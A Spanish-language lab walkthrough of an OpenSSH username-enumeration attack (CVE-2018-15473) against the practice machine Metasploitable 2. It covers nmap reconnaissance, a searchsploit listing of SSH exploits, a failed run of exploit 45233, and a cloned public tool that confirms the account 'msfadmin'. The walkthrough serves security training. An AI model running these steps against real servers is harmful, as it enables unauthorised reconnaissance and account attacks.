# Ataque de Enumeración de Usuarios en un servidor SSH

Ejecutamos Nmap para hacer un reconocimiento del servidor SSH presente en Metasploitable 2.  
`nmap -p 22 192.168.100.93 -A`  

Obtenemos el siguiente resultado:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 19:27 EDT
Nmap scan report for 192.168.100.93
Host is up (0.00063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```
Seguidamente buscamos información adicional con **Searchsploit**.  

Ejecutamos `searchsploit -w ssh 4.7`:  

```
------------------------------------------------ --------------------------------------------
 Exploit Title                                  |  URL
------------------------------------------------ --------------------------------------------
Fortinet FortiGate 4.x < 5.0.7 - SSH Backdoor A | https://www.exploit-db.com/exploits/43386
OpenSSH 2.3 < 7.7 - Username Enumeration        | https://www.exploit-db.com/exploits/45233
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)  | https://www.exploit-db.com/exploits/45210
OpenSSH < 6.6 SFTP (x64) - Command Execution    | https://www.exploit-db.com/exploits/45000
OpenSSH < 6.6 SFTP - Command Execution          | https://www.exploit-db.com/exploits/45001
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disable | https://www.exploit-db.com/exploits/40962
OpenSSH < 7.4 - agent Protocol Arbitrary Librar | https://www.exploit-db.com/exploits/40963
OpenSSH < 7.7 - User Enumeration (2)            | https://www.exploit-db.com/exploits/45939
------------------------------------------------ --------------------------------------------
```

Clonamos el exploit 45233 y probamos si nos funciona:

```
┌──(kali㉿kali)-[~/ssh-audit]
└─$ searchsploit -m 45233   
  Exploit: OpenSSH 2.3 < 7.7 - Username Enumeration
      URL: https://www.exploit-db.com/exploits/45233
     Path: /usr/share/exploitdb/exploits/linux/remote/45233.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/ssh-audit/45233.py


                                                                                             
┌──(kali㉿kali)-[~/ssh-audit]
└─$ chmod +x 45233.py 
                                                                                             
┌──(kali㉿kali)-[~/ssh-audit]
└─$ ./45233.py                   
./45233.py: 22: import: not found
./45233.py: 23: import: not found
./45233.py: 24: import: not found
./45233.py: 25: import: not found
./45233.py: 26: import: not found
./45233.py: 27: import: not found
./45233.py: 28: import: not found
./45233.py: 30: old_parse_service_accept: not found
./45233.py: 33: Syntax error: "(" unexpected
```

Al parecer este exploit no funciona con la versión de Python instalada. Podemos buscar otros exploits relacionados con este CVE en la internet.  
Ejemplo: https://github.com/epi052/cve-2018-15473. Lo descargamos y configuramos:

```
git clone https://gitlab.com/epi052/cve-2018-15473.git
cd cve-2018-15473
pip install -r requirements.txt 
```

Luego podemos utilizar esta herramienta para enumerar usuarios en el servidor Metasploitable:

```
┌──(kali㉿kali)-[~/cve-2018-15473]
└─$ ./ssh-username-enum.py 192.168.100.93 -u msfadmin2
[+] OpenSSH version 4.7 found
                                                                                             
┌──(kali㉿kali)-[~/cve-2018-15473]
└─$ ./ssh-username-enum.py 192.168.100.93 -u msfadmin 
[+] OpenSSH version 4.7 found
[+] msfadmin found!
```


